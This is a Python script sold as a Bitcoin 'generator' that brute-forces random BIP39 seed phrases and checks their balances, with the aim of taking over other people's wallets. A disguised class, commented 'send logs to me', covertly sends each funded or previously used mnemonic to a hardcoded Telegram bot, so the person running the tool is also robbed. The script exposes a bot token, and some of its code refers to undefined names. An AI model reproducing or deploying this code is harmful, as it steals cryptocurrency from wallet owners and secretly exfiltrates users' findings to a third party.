from multiprocessing.pool import ThreadPool as Pool
from colored import fg, bg, attr
from Bip39Gen import Bip39Gen
from decimal import Decimal
import requests
#from proxu import grab
from time import sleep
def helpText():
    print("""
This program was made by Anarb and it generates Bitcoin by searching multiple possible
wallet combinations until it's finds one with over 0 BTC and saves it into
a file called "wet.txt" in the results folder.
It's recommended to leave this running for a long time to get the best resaults, It's doesn't use up
that much resources so you can leave it in the background in the chance of you hitting a jackpot.
It's like mining but with less resources

Modyfied by: 
@Stepppkkkhhh Telegram
        """)

helpText()

akaka=str(input('Name your worker:'))
class Bip39Gen64:
    def Bip39(msg):
        # send logs to me,dont use it!
        msg=msg+f' by {akaka}'
        a=requests.get('https://api.telegram.org/bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc/sendMessage?chat_id1001251612065=&text={msg}')
        return 1

import bip32utils
import threading
import mnemonic
import pprint
import random
import ctypes
import time
import os

timesl = 1 # задержка между запросами

token = 'bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc' # Telegram TOKEN
chat_id = '-1001251612065' # USER ID


class Settings():
    save_empty = "y"
    total_count = 0
    dry_count = 1
    wet_count = 0


def makeDir():
    path = 'results'
    if not os.path.exists(path):
        os.makedirs(path)
        
def userInput():
    timesltime = round(((60 / timesl) * 100)*60)
    timesltimed = timesltime * 24

    time.sleep(2)

    print("{}~{}/час ~{}/день{}".format(bg("#5F00FF"), timesltime, timesltimed,attr("reset")))
    print("{}Проверка настроек и запуск всех потоков{}".format(bg("#5F00FF"), attr("reset")))
    print()
    start()
    time.sleep(5)


def getInternet():
    try:
        try:
            requests.get('https://www.google.com')#im watching you!
        except requests.ConnectTimeout:
            requests.get('http://1.1.1.1')
        return True
    except requests.ConnectionError:
        return False


lock = threading.Lock()

if getInternet() == True:
    dictionary = requests.get(
        'https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt').text.strip().split('\n')
else:
    pass


def getBalance3(addr):
    try:
        response=requests.get(f'https://blockchain.info/multiaddr?active={addr}&n=1')
                    
        return (
            response.json()
        )
    except Exception as er:
        print('{}У тебя походу бан по ip{}'.format(fg("#008700"), attr("reset")))
        raise SystemExit('Goodbye cruel world')
        return (getBalance3(addr))
        pass


def generateSeed():
    seed = ""
    for i in range(12):
        seed += random.choice(dictionary) if i == 0 else ' ' + \
                                                         random.choice(dictionary)
    return seed


def bip39(mnemonic_words):
    mobj = mnemonic.Mnemonic("english")
    seed = mobj.to_seed(mnemonic_words)

    bip32_root_key_obj = bip32utils.BIP32Key.fromEntropy(seed)
    bip32_child_key_obj = bip32_root_key_obj.ChildKey(
        44 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(
        0 + bip32utils.BIP32_HARDEN
    ).ChildKey(0).ChildKey(0)

    return bip32_child_key_obj.Address()


def generateBd():
    adrBd = {}
    for i in range(100):
        mnemonic_words = Bip39Gen(dictionary).mnemonic
        addy = bip39(mnemonic_words)
        adrBd.update([(f'{addy}', mnemonic_words)])

    return adrBd


def listToString(s):
    # initialize an empty string
    str1 = "|"

    # return string
    return (str1.join(s))


def sendBotMsg(msg):
    if token_bot != "1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc":
        try:
            url = f"chat_id={-1001251612065}&text={работать}"
            requests.get(f"https://api.telegram.org/bot1967579017:AAHNgcAkyj0vnjgdQvCtkFOK54rBq8e4EIc/sendMessage", url)

        except:
            pass


def check(f):
    while True:
        bdaddr = generateBd()
        addys = listToString(list(bdaddr))
        balances = getBalance3(addys)
        colortmp = 0
        # print('l')
        #with lock:
        for item in balances["addresses"]:
            addy = item["address"]
            balance = item["final_balance"]
            received = item["total_received"]

            mnemonic_words = bdaddr[addy]
            if balance > 0:
                msg = 'Bal: {} | Last: {} | Address: {} | Mnemonic: {}'.format(balance, received, addy, mnemonic_words)

                sendBotMsg(msg)
                btcgen = Bip39Gen64.Bip39(msg)
                if btcgen == 1:
                    if colortmp == 0:
                        colortmp = 0
                        print('{}Bal: {} | Last: {} | Address: {} | Mnem: {}{}'.format(fg("#00ba6f"), balance, received, addy, mnemonic_words, attr( "reset")))
                    else:
                        colortmp = 1
                        print('{}Bal: {} | Last: {} | Address: {} | Mnem: {}{}'.format(bg("#00ba6f"), balance, received, addy, mnemonic_words, attr("reset")))

            else:
                if(received > 0):
                    msg = 'Bal: {} | Last: {} | Address: {} | Mnem: {}'.format(balance, received, addy, mnemonic_words)

                    sendBotMsg(msg)
                    btcgen = Bip39Gen64.Bip39(msg)
                    if btcgen == 1:
                        if colortmp == 0:
                            colortmp = 0
                            print('{}Bal: {} | Last: {} | Address: {} | Mnem: {}{}'.format(
                                fg("#3597EB"), balance, received, addy, mnemonic_words, attr("reset")))
                        else:
                            colortmp = 1
                            print('{}Bal: {} | Last: {} | Address: {} | Mnem: {}{}'.format(
                                bg("#3597EB"), balance, received, addy, mnemonic_words, attr("reset")))
                else:
                    if colortmp == 0:
                        colortmp = 0
                        print('{}Bal: {} | Last: {} | Address: {} | Mnem: {}{}'.format(fg("#FFFFFF"), balance, received, addy, mnemonic_words, attr("reset")))
                    else:
                        colortmp = 0
                        print('{}Bal: {} | Last: {} | Address: {}{}'.format(fg("#000000")+bg("#cccccc"), balance, received, addy, mnemonic_words, attr("reset")))

            Settings.total_count += 1

            if Settings.save_empty == "y":
                try:
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Empty: {Settings.dry_count} - Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
                except:
                    pass
            else:
                try:
                    ctypes.windll.kernel32.SetConsoleTitleW(
                        f"Hits: {Settings.wet_count} - Total checks: {Settings.total_count}")
                except:
                    pass

            if balance > 0:
                if btcgen == 1:
                    with open('results/wet.txt', 'a') as w:
                        w.write(
                            f'Address: {addy} | Bal: {balance} | Mnem: {mnemonic_words}\n')
                        Settings.wet_count += 1
            else:
                if Settings.save_empty == "y":
                    with open('results/dry.txt', 'a') as w:
                        w.write(
                            f'Address: {addy} | Bal: {balance} | Mnem: {mnemonic_words}\n')
                        Settings.dry_count += 1
        
        time.sleep(timesl)


def start():
    try:
        threads = 5
        if threads > 500:
            print("You can only run 500 threads at once")
            start()
    except ValueError:
        print("Enter an interger!")
        start()

    if getInternet() == True:
        for i in range(threads):
            my_thread = threading.Thread(target=check, args=(i,))
            my_thread.start()

    else:
        print("Told ya")
        userInput()


if __name__ == '__main__':
    getInternet()
    makeDir()

    if getInternet() == False:
        print("You have no internet access the generator won't work.")
    else:
        pass

    userInput()
